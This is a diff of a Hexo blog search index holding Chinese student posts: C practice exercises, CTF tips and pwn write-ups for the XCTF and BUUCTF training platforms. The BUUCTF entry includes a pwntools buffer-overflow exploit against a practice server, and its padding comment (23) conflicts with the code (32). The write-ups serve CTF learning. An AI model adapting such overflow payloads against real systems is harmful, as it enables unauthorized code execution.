@@ -4,6 +4,71 @@
   
     
     <entry>
+      <title></title>
+      <link href="/2025/02/11/zuo-ti-zhu-yi-shi-xiang/"/>
+      <url>/2025/02/11/zuo-ti-zhu-yi-shi-xiang/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一些小事："><a href="#一些小事：" class="headerlink" title="一些小事："></a>一些小事：</h1><p>用nc的时候要去掉冒号</p><p>py2和py3写exp有区别，py3要对字符串处理：在 Python 3 里，字符串（<code>str</code> 类型）和字节（<code>bytes</code> 类型）是不同的数据类型，不能直接进行拼接操作。</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/02/11/suan-fa/"/>
+      <url>/2025/02/11/suan-fa/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="1-取大"><a href="#1-取大" class="headerlink" title="1.取大"></a>1.取大</h2><p>源代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cby1</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b, <span class="type">int</span> *c)</span> {</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, a, b, c);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">cby2</span><span class="params">( <span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> {</span><br><span class="line"><span class="keyword">if</span> (a &gt;= b) {</span><br><span class="line"><span class="keyword">if</span> (a &gt;= c) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, a);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, c);</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="keyword">if</span> (b &gt;= c) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, b);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, c);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span> {</span><br><span class="line"><span class="type">int</span> d, e, f;</span><br><span class="line">cby1(&amp;d, &amp;e, &amp;f);</span><br><span class="line">cby2(d, e, f);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>优化：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    <span class="type">int</span> max = a;</span><br><span class="line">    <span class="keyword">if</span> (b &gt; max) {</span><br><span class="line">        max = b;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (c &gt; max) {</span><br><span class="line">        max = c;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, max);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>使用中间变量max</p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>![image-20250211130605403](C:/Users/clever boy/AppData/Roaming/Typora/typora-user-images/image-20250211130605403.png)</p><p>规律：前一项的分子是后一项的分母，下一项的分子是前两项分母和</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义函数 sumOfFractionSeries，用于计算分数序列 2/1, 3/2, 5/3, 8/5, ... 的前 n 项和</span></span><br><span class="line"><span class="comment">//  n为项数</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">sumOfFractionSeries</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="comment">// sum，用于累加分数序列的每一项，初始值为 0.0</span></span><br><span class="line">    <span class="type">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    <span class="comment">// 分数序列的第一项分子是 2</span></span><br><span class="line">    <span class="type">int</span> numerator = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 分数序列的第一项分母是 1</span></span><br><span class="line">    <span class="type">int</span> denominator = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 定义一个临时变量 temp，用于在交换分子分母值时暂存分子的值</span></span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="comment">// 使用 for 循环遍历分数序列的前 n 项</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">        <span class="comment">// 计算当前项的值，将分子强制转换为 double 类型，以保证除法运算结果为浮点数</span></span><br><span class="line">        sum += (<span class="type">double</span>)numerator / denominator;</span><br><span class="line">        temp = numerator;</span><br><span class="line">        <span class="comment">// 更新分子的值，新的分子等于当前分子与分母的和</span></span><br><span class="line">        numerator = numerator + denominator;</span><br><span class="line">        <span class="comment">// 更新分母的值，新的分母等于之前暂存的分子的值</span></span><br><span class="line">        denominator = temp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="comment">// 调用 sumOfFractionSeries 函数，传入 n 作为参数，计算分数序列前 n 项的和</span></span><br><span class="line">    <span class="type">double</span> result = sumOfFractionSeries(n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/02/11/gong-fang-shi-jie-pwn/"/>
+      <url>/2025/02/11/gong-fang-shi-jie-pwn/</url>
+      
+        <content type="html"><![CDATA[<h2 id="食用须知："><a href="#食用须知：" class="headerlink" title="食用须知："></a>食用须知：</h2><p>这是些在攻防世界平台上pwn的wp<br>含有做题过程，有些试错像是废话请见谅<br>因本人水平有限，若有错误欢迎批评指正（手动玫瑰）</p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1.get_shell"></a>1.get_shell</h2><p>nc即可<br>用nc的时候要去掉冒号</p><h2 id="2-hello-pwn"><a href="#2-hello-pwn" class="headerlink" title="2.hello_pwn"></a>2.hello_pwn</h2><p>![image-20250210092954952](C:/Users/clever boy/AppData/Roaming/Typora/typora-user-images/image-20250210092954952.png)</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/02/11/pwn-na-xie-shi/"/>
+      <url>/2025/02/11/pwn-na-xie-shi/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/02/11/buuctf-pwn/"/>
+      <url>/2025/02/11/buuctf-pwn/</url>
+      
+        <content type="html"><![CDATA[<h2 id="食用须知："><a href="#食用须知：" class="headerlink" title="食用须知："></a>食用须知：</h2><p>这是些在buuctf平台上pwn的wp<br>含有做题过程，有些试错像是废话请见谅<br>因本人水平有限，若有错误欢迎批评指正（手动玫瑰）</p><h2 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h2><p>nc即可<br>用nc的时候要去掉冒号</p><h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h2><p>![image-20250209202001708](C:/Users/clever boy/AppData/Roaming/Typora/typora-user-images/image-20250209202001708.png)</p><p>gets读入，puts输出。我是不是能把gets喂撑，让puts把flag吐出来呢？</p><p>![image-20250209214342830](C:/Users/clever boy/AppData/Roaming/Typora/typora-user-images/image-20250209214342830.png)exp如下：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node5.buuoj.cn'</span>,<span class="number">27135</span>)</span><br><span class="line">address = <span class="number">0x00401186</span> <span class="comment">#system地址</span></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">32</span>+p64(address)  <span class="comment"># 填充 23 字节，23为偏移量</span></span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hello World</title>
       <link href="/2025/02/05/hello-world/"/>
       <url>/2025/02/05/hello-world/</url>
